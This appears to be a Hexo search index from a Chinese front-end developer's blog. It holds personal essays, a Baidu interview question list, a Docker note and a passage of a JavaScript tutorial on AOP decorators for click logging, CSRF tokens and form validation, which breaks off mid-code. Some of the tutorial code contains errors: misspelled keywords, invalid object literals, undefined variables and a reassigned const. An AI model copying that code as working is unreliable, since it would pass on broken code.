<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>置顶公告</title>
      <link href="/2019/11/14/attention/"/>
      <url>/2019/11/14/attention/</url>
      
        <content type="html"><![CDATA[<p>2019年11月14~15日：<a href="https:www.cnblogs/okaychen" target="_blank" rel="noopener">博客园</a>博文迁移完成，博客整改，新增Valine评论</p><a id="more"></a>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>node爬虫实践</title>
      <link href="/2019/11/05/node-cheerio-reptile-md/"/>
      <url>/2019/11/05/node-cheerio-reptile-md/</url>
      
        <content type="html"><![CDATA[<p>先简单做了一个小demo，可以设定贴吧名和特定页码爬取，源码：<a href="https://github.com/okaychen/NetworkMonitoring" target="_blank" rel="noopener">node-repitle</a><br>主要用的依赖：cheerio，superagent，koa</p><p><img src="https://www.chenqaq.com/assets/images/node_cheerio01.png" alt="demo"></p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
            <tag> KOA </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最幸福的人，最好的我们，最向往的生活</title>
      <link href="/2019/10/30/life-aboutLife-job20191030-md/"/>
      <url>/2019/10/30/life-aboutLife-job20191030-md/</url>
      
        <content type="html"><![CDATA[<p>老实说已经持续了很长时间的低产出状态，很久没有认真写一篇自己满意的文章了。今年的秋招似乎来的更早，着手准备已经七月中旬，最终选择了百度APP移动研发部(手白)结束自己的九月，往年的校园招聘季金九银十，在今年仿佛已经成为了秋招的末端。秋招节奏更快，整个过程我却只是幸运的那一个，身边的同伴都称得上更好的公司，我坚信大家都会有最好的结果，在未来的学习生活工作中我也希望我能不遗余力的帮助大家。</p><a id="more"></a><p>之前有位女生问我说，马上就要迎来考研了，近来学校有一些校园招聘宣讲会，在想有没有必要先参加一下，但是一时间又不知道自己该做什么。首先要清楚的一个事实是，学校的招聘本身很小众化，如果没有找到自己心仪的岗位，不要担心也不要气馁，人生何时都可以大放异彩，我相信这种情况坚持考研才是最正确的选择。该如何选择考研或者就业？这是一个问号，永远没有一个完全确定好坏的答案，我觉得这种情况下一定是结合”个人情况”和”个人特点”综合考虑，是不是有自己感兴趣的职业，评估自己掌握的专业知识和技能，自己更想深造或者是去就业创业等等</p><p>也有些不少同学会问我对于技术学习过程中看过的知识点总是很模糊，我相信这也是我和大家的共性问题，美国缅因州的国家训练实验室曾经做过一个研究，用数字形式形象显示了:采用不同的学习方式，学习者在两周以后还能记住内容（平均学习保持率）的多少。我们会发现，最好的方式是主动学习并且学会分享教授他人，然后会是实践，我一直觉得技术只有在适合它的应用场景中不断加以实践你才会发现它吸引你的魅力。</p><p><img src="https://www.chenqaq.com/assets/images/20191030-001.jpg" alt="图：学习金字塔，图片来源网络"></p><p>另外我会维护一个研发面试知识点的开源库<a href="https://github.com/okaychen/FE-Interview-Questions" target="_blank" rel="noopener">前端研发面试</a>，明年秋季招聘会之前如期和大家见面，很感谢牛客网的面经，下面是百度上岸的面经回馈给大家：</p><p>一面(百度百科) 9月21号 9点-10点</p><p>自我介绍热身</p><p>Q1：盒模型的概念</p><p>Q2：定位属性和相关的关系，分别相对与谁，占用文档流的关系</p><p>Q3：IFC和BFC</p><p>Q4：移动端布局的解决方案，前辈最想要的答案是rem和em，平时怎么做处理</p><p>Q5：垂直居中和水平居中的多种解决方案，手写</p><p>Q6：双飞翼布局和圣杯布局的了解</p><p>Q7：跨域方案最熟悉哪个，jsonp怎么做的处理，前后端约定参数在什么地方，写出一个jsonp的简单格式，后台拿到参数后怎么做处理</p><p>Q8：对flex布局的了解,有一个场景问题</p><p>Q9：数据类型有哪些，对symbol的了解</p><p>Q10：ES5以及之前和ES6之后数组有哪些的特性，问的比较细</p><p>Q11：数据传输的方法有哪些，这些方法的作用，get和post的区别</p><p>Q12：你觉得ES6有哪些好用的点，介绍一下</p><p>Q13：promise的了解，手写promise.all</p><p>Q14：场景问题，一个引用框的小动画，从box划到引用框的过程中，怎么保持引用框不消失</p><p>Q15：行我就这些啦，你还有什么问题嘛？</p><p>A：第一个问题问了前辈是哪个部门，主要的技术栈是什么，第二个问题前辈有没有什么建议或者对我想说的话</p><p>结束：谢谢前辈，希望有机会多跟您学习</p><p>二面(部门忘记了..) 9月21号 10:30-11:30</p><p>二面的前辈是按照我的简历一点一点问的，涉及也比较广，感谢很严肃的一个前辈，到最后我看前辈微笑了…</p><p>Q1：没有自我介绍，先写了个快排热身..有没有什么好的改进办法</p><p>Q2：websocket的原理，有http了我们为什么需要websocket</p><p>Q3：HTTP和HTTPS的了解，区别有哪些，要准备的很细</p><p>Q4：数字签名，对称加密和非对称加密的理解，在HTTPS哪个过程</p><p>Q5：HTTP2相对于HTTP1的优势和特点（二进制分帧，头部压缩，服务端推送和多路复用），分别介绍一下</p><p>Q6：HTTP的缓存过程（强缓存和协商缓存）要答很细，expires，cache-control，Last-Modified/If-Modified-Since，ETag这些要清楚</p><p>Q7：画一下三次握手和四次挥手，为什么需要四次挥手讲一下</p><p>Q8：从用户输入URL到呈现页面，经历了哪个过程，讲一下自己最熟悉的过程</p><p>Q9：浏览器渲染的过程介绍一下（五步走）</p><p>Q10：场景问题：一个下拉加载该如何实现</p><p>Q11：如果用户滑动过快如何处理（高频率触发事件：防抖和节流）</p><p>Q12：手写防抖和节流，区别在什么地方</p><p>Q13：性能优化的方案有哪些，要分类尽量答很细</p><p>Q14：VUE组件间通信的方案有哪些（props/$emit+v-on，eventbus，vuex），一共有8种，有些比较偏不会用到，答自己常用的即可</p><p>Q15：对MVVM的理解，实现一个简单的MVVM框架</p><p>Q16：对VUE响应式系统的理解</p><p>Q17：前端安全都知道哪些（csrf，xss）分别介绍一下，如何防范</p><p>Q18：webpack原理了解过嘛</p><p>Q19：webpack经常用到哪些，有手动编写过Loader和Plugin嘛，区别在哪</p><p>Q20：你还有什么问题嘛</p><p>A：我的问题同一面..</p><p>结束：谢谢前辈，希望有机会多多跟您学习</p><p>三面(手白-技术经理) 9月21号 12:00-13:30</p><p>“等一下，我先看看前面的面试评价”，”你别紧张，前面两面都过了，都到我这了，咱先热热身…”</p><p>Q1：平时有用过百度嘛，问百度的工作原理（百度蜘蛛的构建原理）</p><p>Q2：你觉得百度建索引的过程的原则是什么，百度蜘蛛和建索引的过程前辈帮引导的特别清楚，以”我的爸爸是李刚”断句举了一个栗子</p><p>Q3：介绍一下你主要的技术栈，刚才你说ES5和ES6，为什么要特别把它们两个区分开呢，你觉得现在ecmascript发展的大方向是什么，谈谈你自己的理解</p><p>Q4：如果要你从vue向react过渡，你觉得你能很快适应嘛（这时候就要谈自己对于三大框架的理解，要尽量清晰的向前辈讲自己的理解）</p><p>Q5：平时做项目不管后台用什么语言，自己会用node去写后台嘛</p><p>Q6：有用过百度的开源产品嘛（富文本解析，百度地图开放接口），平时会关注他们的源码嘛</p><p>Q7：给定一个数字n，让一个字母”比如a”拼接n次，如果这个数字特别大怎么办，写一下（思路是二进制处理）</p><p>Q8：假如箱子里有n个有序号的小球，我拿出了几个，怎么从剩下的中判断我拿出的是哪几个（思路是用数组下标处理，二点，不要轻易的动对象，尽量用有序去表现无序）</p><p>Q9：你还有什么问题嘛？</p><p>A：我的问题还是同一面..</p><p>结束：谢谢前辈，希望有机会多多跟您学习</p><p>三面前辈和我讲的挺多的，记得当时把我的面试表留在他那里了，百度的同学说三面前辈有优选的名额，做了两种打算，一种最坏的打算和前面面试官在讨论会被刷掉，第二种最好的结果会被三面手白的经理优选，收到意向之后也一直在关心部门，当面签看到录取通知那一刻，很感恩也很幸运。有一种幸运叫不负众望，很难想象一种无言的亲情该有多幸福，也许就是放心去闯吧有我们在，国庆回到家开门看到楼梯意外崴脚的妈妈刚动完手术用着拐杖，告诉我说可能要到春节才能康复，整个秋招我却全然不知，就连爸爸哥哥都不会告诉我，如果这份自己满意的答卷迟到些，我会有多愧疚。</p><p>2020年最幸福的人，最好的我们，最向往的生活，一起冲吧</p>]]></content>
      
      
      <categories>
          
          <category> 岁言心语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 岁言心语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker实践-Node应用部署</title>
      <link href="/2018/12/19/docker-howToDeploying-nodeWebapp-md/"/>
      <url>/2018/12/19/docker-howToDeploying-nodeWebapp-md/</url>
      
        <content type="html"><![CDATA[<p>下面是一个简单的例子，用来实现如何在docker容器内运行node程序。</p><p><video src="https://www.chenqaq.com/assets/videos/test-2018-12-19_17.23.50.mp4" controls allowfullscreen="true" loop="true" autoplay="autoplay" muted width="100%" min-height="100%">embed: xss–chrome_test</video></p><a id="more"></a><p>可以通过<code>sudo docker run -it mynodeapp /bin/bash</code>在新容器内开启一个终端并允许进行交互<br><img src="https://www.chenqaq.com/assets/images/docker-bash01.png" alt="在新容器内开启一个终端并可以进行交互"></p><p>关于Dockerfile的简单说明，更新在我的<a href="https://github.com/okaychen/studynotes/blob/master/docker/docker-deploying-node.md" target="_blank" rel="noopener">github的studynotes中</a></p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>清风扶桑，沉醉不得归途</title>
      <link href="/2018/11/06/life-aboutLife20181106/"/>
      <url>/2018/11/06/life-aboutLife20181106/</url>
      
        <content type="html"><![CDATA[<p>其实这标题已经写了几日，然因外界诱惑加上很难找到一个安静的时间地点去完成这篇文章而迟迟没有构思下笔，直到今天得到11月12日漫威之父斯坦·李病逝的消息，我在计算机实验室写下了这篇文章，其实对我来说是一种罪过，与之相比我更愿意选择一个宁静的夜晚。就这样天堂安详的带走了漫威王国的缔造者之一斯坦·李，就在11月9日电影院上映的《毒液》中，我们还看到您客串的镜头，只愿您在平行宇宙间安好。</p><p><img src="https://ss0.baidu.com/6ONWsjip0QIZ8tyhnq/it/u=2976545619,795220049&fm=173&app=49&f=JPEG?w=600&h=400&s=F0A8B955CF9144DE96A0A4C20300A0B3" alt=""></p><a id="more"></a><p>我不否认，我是一个前端领域的探索者，更是一个笔者，喜欢在安静的夜晚写上一篇文章，一度成为了我的一种习惯，就像现在每次打开QQ都忍不住看上兴趣部落两眼（虽然我并不认为这是一种好习惯），我希望我能同时拥有前端和笔者的视野，把这种习惯延续下去，值得庆幸的是我有很多精神领袖，阮一峰老师，张鑫旭大神，阿里的狼叔（I5ting），玉伯。虽然都素未谋面，但我一直追随着他们的脚步，在我的圈子中他们频繁出现，从个人博客，知乎，掘金，github，最后到语雀。相信文章是有温情的，虽未曾有过交集，读他们的文章，我仿佛清晰了他们对于技术以及生活的种种姿态，这就是文字的魔力吧！我还有一些追随者和同行者，感谢有人能够支持我的写作，从博客园到github最后到个人博客，让”okaychen“的代号至少在百度搜索清晰明确，还好有你们的存在，给我写作最大的动力。其实用这个代号有些名不副实，我并不会凡事“okay”，我有很强烈并且独立的思想让我尝试拒绝了一些东西。</p><p><img src="https://user-images.githubusercontent.com/32173521/48397188-f1d15900-e757-11e8-90b2-6c681debf313.jpg" alt="u 2304433983 3090314586 fm 214 gp 0"></p><p>有时喜欢笑称“我果然活成了自己的样子”，其实一人发呆亦或未入眠时也难免叹息是错的，青春的光阴岁月我们都曾迷茫和失落。大学两年是最开心充实的日子，因为有师傅一同奋进以及取得种种成果来满足自己的成就感而开心，因为有前端的快速更新迭代而充实，没有青天河，没有北京，电影院，有时甚至没有QQ微信，交际很少，却唯爱写作。我是一个不合格的朋友，因为很少给曾经同窗兄弟以及发小发句贴心问候，只有我身边亲近的看到我的人能感受到我的存在，但是感谢你们待我如初 – 要威傻班长以及飞诸位等等，希望你们早日得以所愿，一生平安。我是一个不合格的管理者，以至于大学二年级有人道来我这个组长很少和他们交流沟通，我曾聚以此事未有丝毫感情色彩的思想沉重反思之，难以破除性格因素，便尝试多利用社交平台沟通，把今年的主要任务放在了社团培养新人以及自身读书提高等方面。我是一个合格的写作者，热爱会促使你“合格”，希望会有越来越多的人喜欢我的写作，以及我运营的github和个人博客等等，也希望在越来越多的平台看到“okaychen”的身影。</p><p>最后送给设计组学弟学妹们，青春的气息是气海雪山，带你入梦，融梦心，破心境，是谓修行，希望你们学有所成，志有所至，开心快乐的度过四年大学时光。</p>]]></content>
      
      
      <categories>
          
          <category> 岁言心语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 岁言心语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用AOP装饰函数-实践篇</title>
      <link href="/2018/10/23/js-higherOrderFn-DecoratorPatternToAOP2-md/"/>
      <url>/2018/10/23/js-higherOrderFn-DecoratorPatternToAOP2-md/</url>
      
        <content type="html"><![CDATA[<h1 id="后续：纸上得来终觉浅"><a href="#后续：纸上得来终觉浅" class="headerlink" title="后续：纸上得来终觉浅"></a>后续：纸上得来终觉浅</h1><p>老大见小T终于摸清了用AOP装饰函数的一些套路，很是欣慰，决定用实际情景让他试一试，老大拿出了一个最常见的AOP的经典应用之一—数据统计上报的情景，分离业务代码和数据统计上报的代码，在实际开发中项目结尾阶段难免要加上很多统计数据的代码，这个过程可能被迫改动早已封装好的函数.</p><a id="more"></a><p>1.老大给小T设定了一个情景如下：页面中有一个登录的button，点击这个button会弹出登录的浮层，与此同时需要进行数据上报来统计有多少用户点击了这个登录的button(这个任务可能是在项目结尾阶段进行的)，让小T发现问题并进行改写：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"login"</span> <span class="attr">id</span>=<span class="string">"login"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> login = <span class="built_in">document</span>.getElementById(<span class="string">'login'</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">const</span> textlogin = login.tagName;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> x = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> showLogin = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'打开登录浮层'</span>);</span></span><br><span class="line">            log(textlogin);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> log = <span class="function"><span class="keyword">function</span> (<span class="params">tag</span>) </span>&#123;</span></span><br><span class="line">            x = x + 1;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'上报标签为：'</span> + tag +<span class="string">','</span>+ <span class="string">'上报次数为：'</span> + x);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 这里我简单的用login按钮单击的次数来模拟，上报过程略</span></span></span><br><span class="line">        &#125;</span><br><span class="line">        login.onclick = showLogin;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>小T发现在showLogin函数里既要弹层又要上报点击次数，两个层面的功能，却被耦合在一个函数中，决定用昨天刚写好的AOP试一试:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"login"</span> <span class="attr">id</span>=<span class="string">"login"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">Function</span>.prototype.after = <span class="function"><span class="keyword">function</span>(<span class="params">afterfn</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> ret = _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span></span><br><span class="line"><span class="javascript">                afterfn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> ret;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> login = <span class="built_in">document</span>.getElementById(<span class="string">'login'</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">const</span> textlogin = login.tagName;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> x = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> showLogin = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'打开登录浮层'</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> log = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">            x = x+1;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'上报标签为：'</span> + tag +<span class="string">','</span>+ <span class="string">'上报次数为：'</span> + x);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        showLogin = showLogin.after(log); <span class="comment">// 打开登录浮层后上报数据</span></span></span><br><span class="line">        login.onclick = showLogin;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>小T欣喜若狂，这样两个不同层面功能的函数就可以单独维护，不存在耦合问题，决定把自己的成果给老大展示一番，老大看了微微一笑点了点头，觉得小T的进步着实很快，决定让他尝试一下用AOP动态改变函数的参数。</p><p>2.现有一个用于发起ajax请求的函数，这个函数负责项目中所有ajax的异步请求，这个ajax函数一直运转良好，跟CGI合作也很愉快，直到一次遭受了CSRF攻击，解决CSRF攻击最简单的方法就是在HTTP请求中加一个token参数，我们虽然可以选择直接多加一个token参数在ajax函数中。但是整个函数会变得十分僵硬，虽然对于现在的项目没有问题，但是将来把这个函数移植到其他项目，或者一个开源库中供他人使用，token参数都将是多余的。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//向后台 cgi 发起一个请求来获取用户信息,传递给 cgi 的参数是baseParam和&#123; name:'sven' &#125;</span></span><br><span class="line"><span class="keyword">let</span> baseParam = &#123;</span><br><span class="line">    modname: modname,</span><br><span class="line">    orgcode: localorgcode,</span><br><span class="line">    cmduuid: cmduuid</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> ajax = <span class="function"><span class="keyword">function</span>(<span class="params">type,url,data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(dir);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type:type,</span><br><span class="line">            url:url,</span><br><span class="line">            data:<span class="built_in">JSON</span>.stringify(<span class="built_in">Object</span>.assign(&#123;&#125;, baseParam, data)),</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                <span class="comment">// 简单假设不做处理</span></span><br><span class="line">                resolve(data);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                reject(data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">ajax(<span class="string">'get'</span>,<span class="string">'http:// xxx.com/userinfo'</span>,&#123;<span class="attr">name</span>:<span class="string">'sven'</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//用于生成token的函数</span></span><br><span class="line"><span class="keyword">let</span> getToken = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Token'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//僵硬的在ajax函数中添加</span></span><br><span class="line"><span class="keyword">var</span> ajax = <span class="function"><span class="keyword">function</span>(<span class="params">type,url,data</span>)</span>&#123;</span><br><span class="line">    data = data || &#123;&#125;;</span><br><span class="line">    data.token = getToken();</span><br><span class="line">    <span class="comment">// 发送ajax请求略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小T看到这里，觉得老大讲的确实有道理，僵硬的在ajax函数中增加传递参数也是正确的，但是复用性不大，无论是换一个项目还是在开源库中供别人使用，这个token都可能会是多余的，小T决定在不修改ajax原函数的情况下用AOP试一下改变函数的参数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params">beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> getToken = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Token'</span>;</span><br><span class="line">&#125;</span><br><span class="line">ajax = ajax.before(<span class="function"><span class="keyword">function</span>(<span class="params">type,url,data</span>)</span>&#123;</span><br><span class="line">    data.Token = getToken();</span><br><span class="line">&#125;)</span><br><span class="line">ajax( <span class="string">'get'</span>, <span class="string">'http:// xxx.com/userinfo'</span>, &#123; <span class="attr">name</span>:<span class="string">'sven'</span> &#125; );</span><br></pre></td></tr></table></figure><p>小T打印出来向后台cgi传递的参数，发现多了token参数<code>{name: &quot;sven&quot;, Token: &quot;Token&quot;}</code>，小T发现用AOP的方式给ajax函数动态装饰上Token参数，保证了ajax是一个纯净的函数，提高ajax函数的复用性。<br>最后老大决定拿出来杀手锏，插件式的表单验证，想试一下小T是不是能融会贯通:</p><p>3.在web项目中，可能存在非常多的表单，如登录，注册，修改用户信息。在表单数据提交给后台之前，常常需要做一些校验，比如登录时需要验证用户名和密码是否为空，这样形如一个formSubmit函数就既要承担提交ajax请求，还要验证用户输入的合法性。这样一来就会造成代码的臃肿，职责混乱，二来谈不上复用性。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"username"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">        密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"password"</span> <span class="attr">type</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"submitBtn"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> username = <span class="built_in">document</span>.getElementById( <span class="string">'username'</span> ),</span></span><br><span class="line"><span class="javascript">            password = <span class="built_in">document</span>.getElementById( <span class="string">'password'</span> ),</span></span><br><span class="line"><span class="javascript">            submitBtn = <span class="built_in">document</span>.getElementById( <span class="string">'submitBtn'</span> );</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="keyword">const</span> formSubmit = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span>(username.value == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="actionscript">                    retrun alert(<span class="string">'用户名不能为空'</span>);</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span>(password.value == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span> alert(<span class="string">'密码不能为空'</span>);</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> param = &#123;</span></span><br><span class="line">                    username = username.value,</span><br><span class="line">                    password = password.value</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">                ajax(<span class="string">'http://xxx.com/login'</span>,param); <span class="comment">//ajax实现略</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">            submitBtn.onclick = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">                formSubmit();</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>小T看到这，决定先把校验的逻辑放到validata函数中：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> validata = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(username.value == <span class="string">''</span>)&#123;</span><br><span class="line">        retrun alert(<span class="string">'用户名不能为空'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(password.value == <span class="string">''</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">'密码不能为空'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formSubmit = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( validata() === <span class="literal">false</span> )&#123; <span class="comment">//校验未通过</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> param = &#123;</span><br><span class="line">        username = username.value,</span><br><span class="line">        password = password.value</span><br><span class="line">    &#125;</span><br><span class="line">   ajax(<span class="string">'http://xxx.com/login'</span>,param); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">submitBtn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    formSubmit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在代码有了一些改进，小T已经把校验的逻辑放到了validata函数中，但是formSubmit函数内部还要计算validata函数的返回值，因为返回值的表明了是否通过校验。接下来小T想通过AOP来优化这段代码，使validata函数和formSubmit函数完全分离开来，这里小T发现些不一样的地方，因为要先校验，如果校验不通过不能执行后面的ajax代码，小T决定对上面学习的AOP进行改写：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params">beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="comment">// beforefn返回false，直接return，不在执行后面的原函数</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> validata = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( username.value === <span class="string">''</span> )&#123;</span><br><span class="line">        alert ( <span class="string">'用户名不能为空'</span> );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( password.value === <span class="string">''</span> )&#123;</span><br><span class="line">        alert ( <span class="string">'密码不能为空'</span> );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formSubmit = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> param = &#123;</span><br><span class="line">    username: username.value,</span><br><span class="line">    password: password.value</span><br><span class="line">    &#125;</span><br><span class="line">    ajax( <span class="string">'http:// xxx.com/login'</span>, param );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">formSubmit = formSubmit.before( validata );</span><br><span class="line"></span><br><span class="line">submitBtn.onclick = <span class="function"><span class="keyword">function</span>(<span 